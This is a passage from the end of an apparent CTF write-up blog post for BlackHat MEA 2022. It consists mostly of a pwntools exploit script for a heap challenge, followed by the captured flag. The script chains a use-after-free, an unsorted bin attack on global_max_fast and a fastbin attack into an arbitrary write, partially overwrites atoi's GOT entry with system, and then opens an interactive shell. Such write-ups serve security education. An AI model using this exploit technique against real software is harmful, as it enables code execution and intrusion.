</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Due to no leak, we need to bruteforce so that this solution will work only if the last two bytes</span>
</span></span><span class="line"><span class="cl"><span class="c1"># of the libc base is 00 00 (0x0000)</span>
</span></span><span class="line"><span class="cl"><span class="n">global_max_fast</span> <span class="o">=</span> <span class="mh">0xd940</span>
</span></span><span class="line"><span class="cl"><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0xf420</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Fill tcache[0x110] until it got full</span>
</span></span><span class="line"><span class="cl"><span class="n">tcache_size</span> <span class="o">=</span> <span class="mh">0x108</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_increment</span> <span class="o">=</span> <span class="mh">0x260</span> <span class="c1"># Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span> <span class="c1"># We can do this because calloc doesn&#39;t use tcache</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Fulfill tcache...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create two chunk with size 0x108</span>
</span></span><span class="line"><span class="cl"><span class="c1"># These will be used later</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create huge chunk</span>
</span></span><span class="line"><span class="cl"><span class="n">max_size</span> <span class="o">=</span> <span class="mh">0x2700</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">max_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create small chunk, so that when we free huge chunk, it won&#39;t get consolidated</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x111</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x111</span><span class="p">)</span> <span class="c1"># This will be used as fake chunk later. We need to set the size to 0x111</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="c1"># Go to unsorted bin</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Now we have unsorted bin chunk&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># With UAF, modify the unsorted bin chunk bk to the global_max_fast-0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_max_fast</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Now bk point to global_max_fast&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now this create will overwrite global_max_fast to random huge value</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">max_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;global_max_fast got overwritten&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, when we free our previous three chunks, it will go to fastbin</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Now, we have fastbin chunk with size 0x110&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># We are going to overwrite atoi got with system</span>
</span></span><span class="line"><span class="cl"><span class="n">atoi_got</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;atoi address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Points to the size of robots[4]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that fastbin is pretty strict with its chunk size, which is why we previously set</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The robots[4] size to 0x111, so that this can be used as a fake fastbin chunk with size 0x110</span>
</span></span><span class="line"><span class="cl"><span class="n">robot_memory_size_offset</span> <span class="o">=</span> <span class="mh">0x4040c8</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">robot_memory_size_offset</span><span class="p">))</span> <span class="c1"># UAF,overwrite fastbin pointer to the robot memory size offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">tcache_size</span><span class="p">)</span> <span class="c1"># Now robot[1] point to the desired offset. We now have arbitrary write</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Now, robots[1] point to the desired offset&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="c1"># Set robots[0] to atoi GOT</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># Arbitrary write</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_offset</span><span class="p">)[:</span><span class="mi">2</span><span class="p">])</span> <span class="c1"># Partial overwrite atoi to system</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Now, atoi is changed to system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># Now, enter sh, and atoi(input) will be system(&#34;sh&#34;)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><code>Flag: BlackHatMEA{1246:23:a4ea71cd5cedf7bd35ff38a9874dd95e04b1153a}</code></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/" data-title="BlackHat MEA CTF 2022" data-via="Chovid99" data-hashtags="Writeup,BlackHat,pwn,heap,unsorted bin,fastbin"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/blackhat/">BlackHat</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/unsorted-bin/">Unsorted Bin</a>,&nbsp;<a href="/tags/fastbin/">Fastbin</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/maplectf-2022/" class="prev" rel="prev" title="MapleCTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>MapleCTF 2022</a>
            <a href="/posts/file-structure-attack-part-1/" class="next" rel="next" title="FILE Structure Attack: Part 1">FILE Structure Attack: Part 1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
